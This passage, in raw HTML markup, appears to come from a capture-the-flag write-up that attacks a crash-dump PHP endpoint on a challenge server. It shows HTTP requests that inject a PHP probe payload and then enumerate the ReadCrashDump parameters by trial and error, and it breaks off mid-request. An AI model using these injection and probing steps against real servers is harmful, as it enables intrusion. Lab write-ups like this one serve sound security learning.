class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1439870976&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I got this response from the server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mon, 26 Dec 2016 22:19:50 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;81&lt;/span&gt;

{
    &amp;quot;success&amp;quot; : true,
    &amp;quot;folder&amp;quot; : &amp;quot;docs&amp;quot;,
    &amp;quot;crashdump&amp;quot; : &amp;quot;crashdump-WgyLFG.php&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, apparently, a file &lt;code&gt;docs/crashdump-WgyLFG.php&lt;/code&gt; was created. That's
very interesting, because this means that we may be able to upload valid
PHP code to be executed. The first thing I did was try to put PHP code in
the exception, to see if it was executed:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;429&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WriteCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lmessage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Message.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Stack trace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;sdkint&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;25&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;device&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;generic_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;product&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sdk_google_phone_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lversion&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;3.10.0+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapsz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;123054440&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;119010712&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapszlimit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;536870912&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;natallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;7198792&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;cpuusage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0.08108108&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;totalstor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1560133632&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freestor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;120262656&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;busystor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1439870976&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:27:39 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;81&lt;/span&gt;

{
    &amp;quot;success&amp;quot; : true,
    &amp;quot;folder&amp;quot; : &amp;quot;docs&amp;quot;,
    &amp;quot;crashdump&amp;quot; : &amp;quot;crashdump-yoerjb.php&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/docs/crashdump-yoerjb.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:28:33 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;488&lt;/span&gt;

{
    &amp;quot;message&amp;quot;: &amp;quot;&lt;span class="cp"&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/span&gt;&amp;quot;,
    &amp;quot;lmessage&amp;quot;: &amp;quot;Message.&amp;quot;,
    &amp;quot;strace&amp;quot;: &amp;quot;Stack trace&amp;quot;,
    &amp;quot;sdkint&amp;quot;: &amp;quot;25&amp;quot;,
    &amp;quot;device&amp;quot;: &amp;quot;generic_x86&amp;quot;,
    &amp;quot;product&amp;quot;: &amp;quot;sdk_google_phone_x86&amp;quot;,
    &amp;quot;lversion&amp;quot;: &amp;quot;3.10.0+&amp;quot;,
    &amp;quot;vmheapsz&amp;quot;: &amp;quot;123054440&amp;quot;,
    &amp;quot;vmallocmem&amp;quot;: &amp;quot;119010712&amp;quot;,
    &amp;quot;vmheapszlimit&amp;quot;: &amp;quot;536870912&amp;quot;,
    &amp;quot;natallocmem&amp;quot;: &amp;quot;7198792&amp;quot;,
    &amp;quot;cpuusage&amp;quot;: &amp;quot;0.08108108&amp;quot;,
    &amp;quot;totalstor&amp;quot;: &amp;quot;1560133632&amp;quot;,
    &amp;quot;freestor&amp;quot;: &amp;quot;120262656&amp;quot;,
    &amp;quot;busystor&amp;quot;: &amp;quot;1439870976&amp;quot;,
    &amp;quot;udid&amp;quot;: &amp;quot;58bc60a3ff0f2f1a&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;No such luck, our code was not executed. By playing with other parameters, I
got this error message when I modified the &lt;code&gt;operation&lt;/code&gt; parameter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;419&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lmessage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Message.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Stack trace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;sdkint&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;25&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;device&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;generic_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;product&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sdk_google_phone_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lversion&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;3.10.0+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapsz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;123054440&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;119010712&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapszlimit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;536870912&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;natallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;7198792&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;cpuusage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0.08108108&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;totalstor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1560133632&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freestor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;120262656&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;busystor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1439870976&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:30:29 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;82&lt;/span&gt;

Fatal error! JSON key &amp;#39;operation&amp;#39; must be set to WriteCrashDump or ReadCrashDump.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, so we can create crash dump file, but we can also read from them. Let's try
to read one. Since I don't know how this API function works, I tried creating
a valid &lt;code&gt;ReadCrashDump&lt;/code&gt; request by trial and error:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;29&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:33:00 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;42&lt;/span&gt;

Fatal error! JSON key &amp;#39;data&amp;#39; must be set.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, a &lt;code&gt;data&lt;/code&gt; key must be set. Let's try this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;40&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:34:02 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;47&lt;/span&gt;

Fatal error! JSON key &amp;#39;crashdump&amp;#39; must be set.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, we now need a &lt;code&gt;crashdump&lt;/code&gt; key. Let's add it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;57&lt;/span&gt;

